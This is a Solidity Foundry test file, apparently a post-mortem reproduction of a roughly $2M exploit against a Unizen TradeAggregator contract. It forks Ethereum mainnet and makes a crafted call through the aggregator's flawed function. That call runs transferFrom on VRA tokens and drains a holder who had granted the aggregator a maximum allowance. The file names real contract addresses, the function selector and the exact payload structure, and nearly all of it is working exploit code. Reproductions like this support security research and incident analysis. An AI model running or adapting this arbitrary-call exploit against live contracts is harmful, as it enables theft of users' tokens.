// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import "./../interface.sol";

// @KeyInfo - Total Lost : ~$2M
// Attacker : https://etherscan.io/address/0x2ad8aed847e8d4d3da52aabb7d0f5c25729d10df
// Vuln Contract : https://etherscan.io/address/0xd3f64baa732061f8b3626ee44bab354f854877ac
// One of the attack txs : https://phalcon.blocksec.com/explorer/tx/eth/0xdd0636e2598f4d7b74f364fedb38f334365fd956747a04a6dd597444af0bc1c0

// @Analysis
// https://twitter.com/Phalcon_xyz/status/1766274000534004187
// https://twitter.com/AnciliaInc/status/1766261463025684707

interface ITradeAggregator {
    // I've written following structs based on regular swap txs to TradeAggregator
    struct Info {
        address to;
        uint256 structMember2; // not sure what this struct member represents
        address token;
        uint256 structMember3;
        uint256 structMember4;
        uint256 structMember5;
        string uuid;
        uint256 apiId;
        uint256 userPSFee;
    }

    struct Call {
        address target;
        uint256 amount;
        bytes data;
    }
}

contract ContractTest is Test {
    ITradeAggregator private constant TradeAggregator =
        ITradeAggregator(0xd3f64BAa732061F8B3626ee44bab354f854877AC);
    IERC20 private constant VRA =
        IERC20(0xF411903cbC70a74d22900a5DE66A2dda66507255);
    address private constant tokenHolder =
        0x12fe4bC7D0B969055F763C5587F2ED0cA1b334f3;

    function setUp() public {
        vm.createSelectFork("mainnet", 19393360);
        vm.label(address(TradeAggregator), "TradeAggregator");
        vm.label(address(VRA), "VRA");
        vm.label(address(tokenHolder), "tokenHolder");
    }

    function testExploit() public {
        emit log_named_decimal_uint(
            "Exploiter VRA balance before attack",
            VRA.balanceOf(address(this)),
            VRA.decimals()
        );

        ITradeAggregator.Info memory info = ITradeAggregator.Info({
            to: address(this),
            structMember2: 0,
            token: address(VRA),
            structMember3: 1,
            structMember4: 0,
            structMember5: 186_783_104_413_296_096,
            uuid: "UNIZEN-CLI",
            apiId: 17,
            userPSFee: 1_875
        });

        bytes memory callData = abi.encodeWithSignature(
            "transferFrom(address,address,uint256)",
            tokenHolder,
            address(TradeAggregator),
            // 41_611_328_550_535_574_847_488 - amount was transfered from the token holder to TradeAggregator in attack tx.
            // Allowance is set to max so transfer everything.
            VRA.balanceOf(tokenHolder)
        );

        ITradeAggregator.Call memory call = ITradeAggregator.Call({
            target: address(VRA),
            amount: 0,
            data: callData
        });

        ITradeAggregator.Call[] memory calls = new ITradeAggregator.Call[](1);
        calls[0] = call;

        bytes memory data = abi.encodeWithSelector(
            bytes4(0x1ef29a02),
            info,
            calls
        );

        // Call to flawed function
        (bool success, ) = address(TradeAggregator).call{value: 1 wei}(data);
        require(success, "Call to TradeAggregator not successful");

        emit log_named_decimal_uint(
            "Exploiter VRA balance after attack",
            VRA.balanceOf(address(this)),
            VRA.decimals()
        );
    }
}
